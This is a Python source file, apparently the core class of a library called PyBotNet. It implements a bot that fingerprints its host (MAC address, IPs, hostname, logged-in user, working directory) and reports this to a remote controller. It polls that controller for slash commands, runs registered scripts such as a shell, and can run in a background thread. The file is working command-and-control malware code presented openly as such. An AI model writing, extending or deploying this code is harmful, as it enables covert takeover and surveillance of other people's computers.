import subprocess
from typing import Dict, List, Optional, TYPE_CHECKING
from functools import wraps
import threading
import platform
import datetime
import logging
import inspect
import random
import string
import uuid
import time
import os

from .context import Context
from .exceptions import UserException, EngineException
from .package_info import __version__, __github_link__
from .utils import get_global_ip, get_host_name_ip


if TYPE_CHECKING:
    from . import BaseEngine


_logger = logging.getLogger(f"--> {__name__}  ")


class BotNet:
    default_scripts = {}

    def __init__(
        self,
        engine: "BaseEngine" = None,
        *,
        bot_name: str = None,
        version: str = "0.1.0",
        delay: int = 1.5,
        use_default_scripts: bool = True,
        start_end_notify: bool = True,
        debug: bool = False,
        **extra,
    ):
        self.engine = engine
        if bot_name is None:
            bot_name = "".join(random.choices(string.ascii_letters, k=5))

        self.BOT_NAME = str(bot_name).strip().replace(" ", "_")

        self.version = version
        self.delay = delay
        self.use_default_scripts = use_default_scripts
        self.start_end_notify = start_end_notify

        self.scripts = {}
        self._debug = debug
        self.__run_time = time.time()
        self.__cache = {
            "system_info": {
                "minimal": {"save_time": None, "data": None},
                "full": {"save_time": None, "data": None},
            }
        }

        if self.use_default_scripts:
            self.scripts.update(**BotNet.default_scripts)

        if self._debug:
            logging.basicConfig(level=logging.DEBUG)
        else:
            logging.basicConfig(level=logging.INFO)

        _logger.debug(
            f"init BotNet, default scripts: {list(BotNet.default_scripts.keys())}, engine: <{self.engine}>"
        )

    def __str__(self):
        return f"BotNet Version: {self.version}, scripts: {list(self.scripts.keys())}"

    @classmethod
    def default_script(
        cls, *, script_name=None, script_version: Optional[str] = None, **extra
    ):
        def decorator(func):
            @wraps(func)
            def wrapper(*args, **kwargs):

                return func(*args, **kwargs)

            wrapper.__name__ = script_name or func.__name__.strip().replace(" ", "_")
            wrapper.__doc__ = func.__doc__
            wrapper.__extra__ = {}
            wrapper.__extra__.update(
                {"script_version": script_version, "default_script": True}
            )

            cls.default_scripts.update({script_name or func.__name__: wrapper})
            return wrapper

        return decorator

    def add_script(
        self, *, script_name=None, script_version: Optional[str] = None, **extra
    ):
        def decorator(func):
            @wraps(func)
            def wrapper(*args, **kwargs):

                return func(*args, **kwargs)

            wrapper.__name__ = script_name or func.__name__.strip().replace(" ", "_")
            wrapper.__doc__ = func.__doc__
            wrapper.__extra__ = {}
            wrapper.__extra__.update(
                {"script_version": script_version, "default_script": False}
            )

            self.scripts.update({script_name or func.__name__: wrapper})
            return wrapper

        return decorator

    def _help(self, script_name=None) -> str:
        all_scripts_name = list(self.scripts.keys())
        all_scripts_name.extend(["help"])
        all_scripts_name = "\n    ".join(all_scripts_name)
        help_str = f"""
# All scripts name:
    {all_scripts_name} 

# Get more details about a script:
    `/help script-name`
    Example:
        `/help shell`

# Run a script:
    
    - For all bots:

    `/[SCRIPT-NAME] [params]`
        Example: 
            `/echo hi`
            `/who`

    - For Select specific bot: 

    `[mac-address] /[SCRIPT-NAME] [params]`
        Example:
            `{str(uuid.getnode())} /echo hi`
            `{str(uuid.getnode())} /who`

    `[BOT-NAME] /[SCRIPT-NAME] [params]`
        Example:
            `{self.BOT_NAME} /echo hi`
            `{self.BOT_NAME} /who`

    `[pid] /[SCRIPT-NAME] [params]`
        Example:
            `{str(os.getpid())} {self.BOT_NAME} /echo hi`
            `{str(os.getpid())} {self.BOT_NAME} /who`

    `[mac-address] [pid] /[SCRIPT-NAME] [params]`
        Example:
            `{str(uuid.getnode())} {str(os.getpid())} /echo hi`
            `{str(uuid.getnode())} {str(os.getpid())} /who`

    `[mac-address] [BOT-NAME] /[SCRIPT-NAME] [params]`
        Example:
            `{str(uuid.getnode())} {self.BOT_NAME} /echo hi`
            `{str(uuid.getnode())} {self.BOT_NAME} /who`


# PyBotNet version: {__version__}
# Docs: {__github_link__}
"""
        if script_name:
            if script_name in ["help", "start"]:
                return help_str

            script = self.scripts.get(script_name)
            if script:
                extra = ""
                for k, v in script.__extra__.items():
                    extra += f"\n{k}: {v}"
                return f"""SCRIPT-NAME:\n{script.__name__}\n\nDESCRIPTION:\n{script.__doc__}\n{extra}"""
            else:
                return f"script `{script_name}` not found\n" + help_str

        return help_str

    def _add_cache(self, name, expier_secound, data):
        exp = time.time() + expier_secound
        self.__cache.update({name: {"exp": exp, "data": data}})

    def _get_cache(self, name) -> tuple[bool, any]:
        """return (is_cache, data)"""
        if self.__cache.get(name):
            if self.__cache[name]["exp"] >= time.time():
                return True, self.__cache[name]["data"]
            return False, None
        return False, None

    def system_info(self, minimal=False):
        """return system info
        (system info cached for 30 seconds)
        """

        # return cache minimal if exist
        if minimal:
            is_cache, data = self._get_cache("minimal_system_info")
            if is_cache:
                data.update({"from cache": True})
                return data
        # return cache full if exist
        else:
            is_cache, data = self._get_cache("full_system_info")
            if is_cache:
                data.update({"from cache": True})
                return data

        minimal_info = {
            "scripts_name": list(self.scripts),
            "mac_addres": uuid.getnode(),
            "pid": os.getpid(),
            "bot_name": self.BOT_NAME,
            "os": platform.system(),
            "global_ip": get_global_ip(),
        }

        if minimal:
            # save cache minimal
            self._add_cache("minimal_system_info", 30, minimal_info)
            return minimal_info

        try:
            system_user = os.getlogin()
        except:
            if platform.system() == "Linux":
                system_user = subprocess.getoutput("whoami")
            else:
                system_user = "unknown"

        full_info = {
            **minimal_info,
            "local_ip": {get_host_name_ip()["host_ip"]},
            "host_name": {get_host_name_ip()["host_name"]},
            "system_user": system_user,
            "up_time": datetime.timedelta(
                seconds=round((time.time() - self.__run_time))
            ),
            "current_route": os.getcwd(),
            "cpu_count": os.cpu_count(),
            "pybotnet_version": __version__,
        }

        # save cache full
        self._add_cache("full_system_info", 30, full_info)

        return full_info

    def _create_context(self, command: List, meta_data: Dict) -> Context:
        context = Context(
            engine=self.engine,
            command=command,
            meta_data=meta_data,
            system_info=self.system_info,
            time_stamp=datetime.datetime.now(),
        )
        return context

    def _valid_command(self, command, check_slash=False, expected_length=1) -> bool:
        if type(command) != list:
            return False

        if len(command) < expected_length:
            return False

        if check_slash:
            if not command[0].startswith("/"):
                return False

        return True

    def _main_while(self):
        while True:

            # stop signal
            if Context.get_global_value("BotNet__stop_background_thread_signal"):
                return

            try:
                command = self.engine.receive()
            except EngineException as e:
                _logger.debug(f"Engine[{self.engine}] Error: {e}")
                command = False

            except Exception as e:
                _logger.debug(f"Engine[{self.engine}] Error: {e}")
                command = False

            # check for mac_addres, self.BOT_NAME or PID
            if self._valid_command(command, expected_length=2):
                command_prefix = [str(uuid.getnode()), self.BOT_NAME, str(os.getpid())]
                for _ in command_prefix:
                    if command[0] in command_prefix:
                        command = command[1:]


            if not self._valid_command(command, check_slash=True):
                _logger.debug("<There is no command to execute>")
                time.sleep(self.delay)
                continue

            command[0] = command[0][1:]  # remove slash

            if command[0] in ["help", "start"]:
                _help_script_name = None

                if len(command) > 1:
                    _help_script_name = command[1]

                self.engine.send(
                    self._help(_help_script_name),
                    additionalـinfo=self.system_info(minimal=True),
                    reply_to_last_message=True,
                )
                time.sleep(self.delay)
                continue

            script = self.scripts.get(command[0])

            if script:
                command = command[1:]

                meta_data = {
                    "script_name": script.__name__,
                    "script_version": script.__extra__.get("script_version"),
                    "script_doc": script.__doc__,
                }

                _logger.debug(
                    f"<BotNet.run: {meta_data['script_name']} {meta_data['script_version']}>"
                )

                context: Context = self._create_context(
                    command=command, meta_data=meta_data
                )

                try:
                    if len(inspect.signature(script).parameters) > 0:
                        script_result = script(context)
                    else:
                        script_result = script()

                except UserException as e:
                    script_result = f"""UserException:
                    script_name: {meta_data["script_name"]}
                    script_version: {meta_data["script_version"]}
                \n{e}"""

                except Exception as e:
                    script_result = f"internal error \n\n{e}"

                finally:
                    if not script_result == None:
                        self.engine.send(
                            script_result,
                            additionalـinfo=self.system_info(minimal=True),
                            reply_to_last_message=True,
                        )
                    time.sleep(self.delay)

            else:
                _logger.debug(f"<There is no script [{command[0]}] to execute>")
                time.sleep(self.delay)

    def run(self):
        if self.start_end_notify:
            self.engine.send("Botnet Start", self.system_info())

        try:
            self._main_while()

        except KeyboardInterrupt:
            pass

        finally:
            if self.start_end_notify:
                self.engine.send("Botnet Exit", self.system_info())

    def run_background(self, *args, **kwargs):
        """run botnet in background"""
        thread = threading.Thread(target=self.run, args=args, kwargs=kwargs)
        thread.start()

    def stop_background(self) -> bool:
        """stop all background threads in this botnet instance"""
        Context.set_global_value("BotNet__stop_background_thread_signal", True)

    def import_external_scripts(self, external_scripts: "ExternalScripts"):
        _logger.debug(
            f"import_external_scripts: {list(external_scripts.scripts.keys())} "
        )
        self.scripts.update(**external_scripts.scripts)


class ExternalScripts(BotNet):
    def __init__(self):
        self.scripts = {}
